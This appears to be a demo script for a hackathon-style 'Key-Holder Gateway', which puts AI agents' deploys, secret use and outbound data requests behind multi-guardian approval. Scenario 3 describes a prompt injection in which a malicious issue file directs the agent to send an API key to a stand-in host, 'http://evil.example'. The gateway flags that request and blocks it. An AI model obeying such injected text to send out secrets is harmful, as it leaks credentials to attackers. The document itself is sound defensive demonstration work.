# Demo Script — Key-Holder Gateway

> **Owner**: P2
> **Target**: 2-minute video + reproducible scripts

---

## Pre-demo Checklist

- [ ] `make reset && make setup` run successfully from clean clone
- [ ] `make dev` starts gateway (mock mode), UI, and MCP server without errors
- [ ] Guardian UI shows 3 seeded pending requests at `http://localhost:5173`
- [ ] MCP server lists 3 tools
- [ ] Scenario scripts 1–4 run without errors

---

## 2-Minute Video Timeline

| Time | Screen | Narration |
|------|--------|-----------|
| 0:00–0:10 | Problem slide / README | "AI agents can deploy, use secrets, and send data — but nothing stops them if they're compromised." |
| 0:10–0:20 | Architecture diagram | "We built a gateway. Any MCP agent goes through it. Sensitive actions need guardian approval." |
| 0:20–0:40 | Scenario 2: legit deploy | Guardian 1 approves → still pending → Guardian 2 approves → executed. Show audit log. |
| 0:40–0:55 | Scenario 3: prompt injection | Show malicious issue → agent calls `request_send_external` → request appears flagged → nobody approves → nothing sent. |
| 0:55–1:10 | Scenario 4: manual attacker | Single guardian tries to approve alone → quorum not met → blocked. |
| 1:10–1:25 | DB / audit log | Show DB contains only ciphertext (TODO: pending P1 TideCloak verification). Show audit log. |
| 1:25–1:45 | TideCloak angle | Briefly show TideCloak login, guardian identity, and (if verified) quorum enforcement. |
| 1:45–2:00 | Limitations + summary | "We don't defend against rubber-stamping or secrets already on the machine. But we do make prompt injection and single-account compromise toothless." |

---

## Scenario 1 — Normal Agent Work

**Narrative**: The agent edits code, runs tests, and opens a PR. No approval needed.

**Script**: `scripts/scenario-1-normal.sh`

**Steps**:
1. Show the MCP tool list — `request_deploy`, `request_use_secret`, `request_send_external`.
2. Demonstrate that code editing and test running are NOT going through the gateway (out of scope).
3. No action requests appear in the guardian UI.

**Expected result**: UI shows 0 new requests.

---

## Scenario 2 — Legitimate Deploy

**Narrative**: The agent is asked to deploy version 1.4.2. Two guardians approve. Deploy executes.

**Script**: `scripts/scenario-2-legit-deploy.sh`

**Steps**:
1. Agent calls `request_deploy` → `{"version": "1.4.2", "commit": "a1b2c3d"}`.
2. Gateway creates request, returns `id` and `status: pending`.
3. Guardian UI shows the new request with parameters and proposer.
4. Guardian 1 approves — UI shows `approvals: 1/2`.
5. Guardian 2 approves — UI shows `status: executed`.
6. Audit log shows: created → approval-1 → approval-2 → executed.
7. Fake-production server log shows the deploy received.

**Expected result**: Request goes from `pending` → `executed`; fake-production records the deploy.

---

## Scenario 3 — Prompt Injection

**Narrative**: A malicious issue tells the agent to send the API key to `http://evil.example`.

**Script**: `scripts/scenario-3-prompt-injection.sh`

**Steps**:
1. Show `mock-env/fixtures/malicious-issue.md` — contains hidden instruction.
2. "Agent reads the issue" (simulated by script calling the MCP tool directly).
3. Agent calls `request_send_external` with `{"destination": "http://evil.example", "payload_ref": "api-key"}`.
4. Gateway creates request; assigns risk signals: `["external-domain", "unknown-destination"]`.
5. Guardian UI shows request **flagged** with risk signals — destination clearly shown.
6. Neither guardian approves (script does nothing).
7. Request expires after TTL.
8. Show that the fake-external server received **nothing**.

**Expected result**: No data sent; request expires; fake-external log is empty.

---

## Scenario 4 — Manual Attacker / Single Compromised Guardian

**Narrative**: Attacker gains access to one guardian account and tries to approve a secret exfiltration.

**Script**: `scripts/scenario-4-manual-attacker.sh`

**Steps**:
1. Attacker creates a `request_use_secret` for `{"secret_name": "PROD_API_KEY", "purpose": "testing"}`.
2. Same account tries to approve → gateway rejects with `SELF_APPROVAL`.
3. A different account (guardian-2) approves — count is 1/2.
4. No second guardian approves.
5. Show that execution is blocked — `status: pending` (or `expired` after TTL).
6. *(Optional)*: Show DB — secrets column shows ciphertext (or FAKE placeholder).

**Expected result**: Cannot execute with only 1 approval; attack is blocked.

---

## Scenario 5 — Parameter Swap After Approval *(Stretch)*

**Narrative**: An attacker approves a safe request, then swaps parameters before the second approval.

**Script**: `scripts/scenario-5-param-swap.sh`

**Steps**:
1. Create `request_deploy` with `{"version": "1.4.2", "commit": "a1b2c3d"}`.
2. Guardian 1 approves — `parametersHash` is recorded.
3. (Simulate attacker modifying the request parameters in the DB.)
4. Guardian 2 tries to approve — gateway detects `HASH_MISMATCH` and rejects.
5. Request is rejected; deploy does not execute.

**Expected result**: Hash mismatch prevents execution even with 2 approvals.

---

## Filming Notes

- Use OBS or QuickTime to capture browser + terminal side by side.
- Terminal font size: 18pt minimum.
- Browser zoom: 125%.
- Show request IDs in both terminal output and UI to connect the story.
- Keep narration calm; pause 1 second after each key moment.
- Export as MP4, 1080p, max 120 seconds.

---

## TODO (P2)

- [ ] Fill in actual command examples in each script.
- [ ] Record a dry run and note timing adjustments.
- [ ] Capture the TideCloak login screen for the 1:25 mark.
- [ ] Add architecture diagram image to README and video.
